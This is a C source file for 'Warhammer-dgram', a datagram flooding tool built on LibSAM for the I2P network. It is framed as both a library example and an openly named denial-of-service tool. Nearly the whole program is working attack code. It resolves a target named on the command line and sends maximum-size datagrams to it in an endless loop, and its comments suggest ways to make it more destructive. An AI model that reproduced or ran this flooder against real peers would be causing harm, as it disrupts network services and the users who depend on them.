/*
 * Copyright (c) 2004, Matthew P. Cashdollar <mpc@innographx.com>
 * All rights reserved.
 * 
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions are
 * met:
 * 
 *     * Redistributions of source code must retain the above copyright
 * notice, this list of conditions and the following disclaimer.
 *     * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *     * Neither the name of the author nor the names of any contributors
 * may be used to endorse or promote products derived from this software
 * without specific prior written permission.
 * 
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS
 * IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED
 * TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A
 * PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER
 * OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL,
 * EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO,
 * PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR
 * PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF
 * LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING
 * NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE OF THIS
 * SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

/*
 * Warhammer-dgram: a simple denial of service tool which uses datagrams, and
 * illustrates how LibSAM works.
 * Use only with the utmost courtesy.
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include "sam.h"

/*
 * LibSAM callbacks - functions in our code that are called by LibSAM when
 * something happens
 */
static void dgramback(sam_sess_t *session, sam_pubkey_t dest, void *data,
	size_t size);
static void diedback(sam_sess_t *session);
static void logback(char *s);
static void namingback(sam_sess_t *session, char *name, sam_pubkey_t pubkey,
	samerr_t result);

/*
 * Just some ugly global variables.  Don't do this in your program.
 */
bool gotdest = false;
sam_pubkey_t dest;

int main(int argc, char *argv[])
{
	/*
	 * The target of our attack is specified on the command line
	 */
	if (argc != 2) {
		fprintf(stderr, "Syntax: %s <b64dest|name>\n", argv[0]);
		return 1;
	}

	/* Hook up the callback functions - required by LibSAM */
	sam_dgramback = &dgramback;
	sam_diedback = &diedback;
	sam_logback = &logback;
	sam_namingback = &namingback;

	/*
	 * This tool would be more destructive if multiple SAM session were used,
	 * but they aren't - at least for now.
	 */
	sam_sess_t *session = NULL;  /* set to NULL to have LibSAM do the malloc */
	session = sam_session_init(session);  /* malloc and set defaults */

	/* Connect to the SAM server -- you can use either an IP or DNS name */
	samerr_t rc = sam_connect(session, "localhost", 7656, "TRANSIENT",
		SAM_DGRAM, 2);  /* the tunnel length of 2 can be adjusted to whatever */
	if (rc != SAM_OK) {
		fprintf(stderr, "SAM connection failed: %s\n", sam_strerror(rc));
		sam_session_free(&session);
		return 1;
	}

	/*
	 * Check whether they've supplied a hostname or a base 64 destination
	 *
	 * Note that this is a hack.  Jrandom says that once certificates are added,
	 * the length could be different depending on the certificate's size.
	 */
	if (strlen(argv[1]) == SAM_PUBKEY_LEN - 1) {
		memcpy(dest, argv[1], SAM_PUBKEY_LEN);
		gotdest = true;
	} else {
		/*
		 * If they supplied a name, we have to do a lookup on it.  This is
		 * equivalent to doing a DNS lookup on the normal internet.  When the
		 * lookup completes, we send them some data.
		 */
		sam_naming_lookup(session, argv[1]);
	}

	while (!gotdest)  /* just wait for the naming lookup to complete */
		sam_read_buffer(session);

	char data[SAM_DGRAM_PAYLOAD_MAX];
	memset(data, '$', SAM_DGRAM_PAYLOAD_MAX);  /* We're sending them MONEY! */
	size_t sentbytes = 0;
	while (true) {
		/*
		 * Send them a flood of the largest sized datagrams possible in an
		 * infinite loop!
		 */
		rc = sam_dgram_send(session, dest, data, SAM_DGRAM_PAYLOAD_MAX);
		if (rc != SAM_OK) {
			fprintf(stderr, "sam_dgram_send() failed: %s\n", sam_strerror(rc));
			sam_session_free(&session);
			return 1;
		}
		sentbytes += SAM_DGRAM_PAYLOAD_MAX;
		printf("Bombs away! (%u kbytes sent so far)\n", sentbytes / 1024);
		/*
		 * sam_read_buffer() just checks for incoming activity from the SAM
		 * session, and invokes the appropriate callbacks.  We aren't really
		 * expecting any incoming activity here, but it is a good idea to check
		 * anyway.
		 */
		sam_read_buffer(session);
	}

	sam_session_free(&session); /* de-allocates memory used by the SAM session*/
	return 0;
}

/*
 * When we receive some data from another peer, just ignore it.  Denial of
 * service programs don't need input ;)
 */
static void dgramback(sam_sess_t *session, sam_pubkey_t dest, void *data,
	size_t size)
{
	puts("Received a datagram (ignored)");
	free(data);
}

/*
 * This is called whenever the SAM connection fails (like if the I2P router is
 * shut down)
 */
static void diedback(sam_sess_t *session)
{
	fprintf(stderr, "Lost SAM connection!\n");
	exit(1);
}

/*
 * The logging callback prints any logging messages from LibSAM (typically
 * errors)
 */
static void logback(char *s)
{
	fprintf(stderr, "LibSAM: %s\n", s);
}

/*
 * This is really hackish, but we know that we are only doing one lookup, so
 * what the hell
 */
static void namingback(sam_sess_t *session, char *name, sam_pubkey_t pubkey,
	samerr_t result)
{
	if (result != SAM_OK) {
		fprintf(stderr, "Naming lookup failed: %s\n", sam_strerror(result));
		exit(1);
	}
	memcpy(dest, pubkey, SAM_PUBKEY_LEN);
	gotdest = true;
}
